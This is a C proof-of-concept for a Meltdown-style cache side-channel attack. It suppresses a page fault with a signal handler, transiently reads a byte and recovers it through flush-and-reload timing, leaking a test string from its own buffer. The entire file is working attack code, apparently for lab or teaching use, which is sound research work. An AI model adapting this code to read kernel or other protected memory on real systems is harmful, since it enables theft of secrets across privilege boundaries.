#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <sys/ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <x86intrin.h>
#include "../tools/tools.h"

#define STRIDE 4096
uint8_t channel[256 * STRIDE];
int finished_one = 0;

/* 用户态“秘密”缓冲区，用来写入固定字符串 */
static unsigned char secret_buf[256] __attribute__((aligned(STRIDE)));
static const unsigned long fault_addr = 0xffff000000000000UL;

void flush_cache()
{
    for (int i = 0; i < 256; i++)
    {
        flush_addr(&channel[i * STRIDE]);
    }
}

extern char stopspeculate[];

static void __attribute__((noinline)) victim(unsigned long secret_addr)
{
    __asm__ volatile(
        /* ========== 对 kaddr 做延时计算（不改变最终访问地址） ========== */

        /* 把 %[kaddr] 的值载入 %rbx */
        "mov %[kaddr], %%rbx\n\t"
        /* 减 2 */
        "sub $2, %%rbx\n\t"
        /* A = 2, B = 1 */
        "mov $2, %%rcx\n\t" /* A */
        "mov $1, %%rdx\n\t" /* B */
        /* B << 5 → B = 32 */
        "shl $5, %%rdx\n\t"
        /* 做四次 B / A */
        "mov %%rdx, %%rax\n\t"
        "cqo\n\t"
        "idiv %%rcx\n\t" /* rax = 16 */
        "mov %%rax, %%rdx\n\t"

        "mov %%rdx, %%rax\n\t"
        "cqo\n\t"
        "idiv %%rcx\n\t" /* rax = 8 */
        "mov %%rax, %%rdx\n\t"

        "mov %%rdx, %%rax\n\t"
        "cqo\n\t"
        "idiv %%rcx\n\t" /* rax = 4 */
        "mov %%rax, %%rdx\n\t"

        "mov %%rdx, %%rax\n\t"
        "cqo\n\t"
        "idiv %%rcx\n\t" /* rax = 2 */

        /* 把结果加回 rbx → rbx = original_kaddr - 2 + 2 = original_kaddr */
        "add %%rax, %%rbx\n\t"

        /* ========== 现在用计算后的 rbx（值未变）触发异常 ========== */
        "mov (%%rbx), %%rax\n\t" /* ← 这里触发 SIGSEGV！*/

        /* ========== 瞬态执行：读取 secret 并编码 ========== */
        "movzbl (%[saddr]), %%eax\n\t"
        "shl $12, %%rax\n\t"
        "movb (%[target], %%rax, 1), %%al\n\t"

        /* 信号处理器跳转点 */
        ".globl stopspeculate\n\t"
        "stopspeculate:\n\t"
        "nop\n\t"

        :
        : [target] "r"(channel),
          [saddr] "r"(secret_addr),
          [kaddr] "r"(fault_addr)
        : "rax", "rbx", "rcx", "rdx", "cc", "memory");
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
    return;
}

int set_signal(void)
{
    struct sigaction act = {
        .sa_sigaction = sigsegv,
        .sa_flags = SA_SIGINFO,
    };

    return sigaction(SIGSEGV, &act, NULL);
}

static int results[256];
int recover_secret_byte(unsigned long addr, int threshold)
{
    static char buf[256];

    memset(results, 0, sizeof(results));

    for (int i = 0; i < 1000; i++)
    {
        flush_cache();

        MFENCE;

        victim(addr);

        MFENCE;

        for (int off = 0; off < 2; off++)
        {
            // 128 页的顺序最好做一次 Fisher–Yates 打乱
            for (int page = 0; page < 128; page++)
            {
                int i = page * 2 + off; // 第 page 页的第 off 桶
                if (time_access((void *)&channel[i * STRIDE]) < threshold)
                    results[i]++;
            }
        }
        // for (int i = 0; i < 256; i++)
        // {
        //     int mix_i = ((i * 167) + 13) & 255;

        //     if (time_access((void *)&channel[mix_i * STRIDE]) < threshold)
        //         results[mix_i]++;
        // }
    }
    // 统计时**跳过训练那一行**
    int max = -1, best = -1;
    for (int i = 0; i < 256; i++)
    {
        if (results[i] > max)
        {
            max = results[i];
            best = i;
        }
    }

    if (results[best] > 0)
        finished_one = 1;
    else
        finished_one = 0;

    return best;
}

int main()
{
    int ret, i;
    unsigned long addr = 0, size = 0;

    memset(channel, 1, sizeof(channel));

    ret = set_signal();
    if (ret != 0)
    {
        perror("set_signal");
        return 1;
    }

    const char *secret = "Meltdown PoC Attack Success!";
    memset(secret_buf, 0, sizeof(secret_buf));
    memcpy(secret_buf, secret, strlen(secret)); // “写入”固定字符串
    addr = (unsigned long)secret_buf;           // 起始地址
    size = strlen((const char *)secret_buf);    // 长度

    uint64_t threshold = measure_access_time();


    size_t secret_len = strlen(secret);
    char recovered_string[secret_len + 1];
    memset(recovered_string, 0, sizeof(recovered_string));

    printf("[*] Leaking secret: \"%s\"\n", secret);
    printf("[*] Starting attack...\n\n");
    fflush(stdout);
    for (int i = 0; i < secret_len; i++)
    {
        int recovered_byte = recover_secret_byte(addr, threshold);
        if (!finished_one)
        {
            i--;
            continue;
        }
        recovered_string[i] = (recovered_byte > 31 && recovered_byte < 127) ? (char)recovered_byte : '?';
        printf("\rLeaked: %s", recovered_string);
        fflush(stdout);
        addr++;
    }
    printf("\n\n[*] Attack finished.\n\n");
    return 0;
}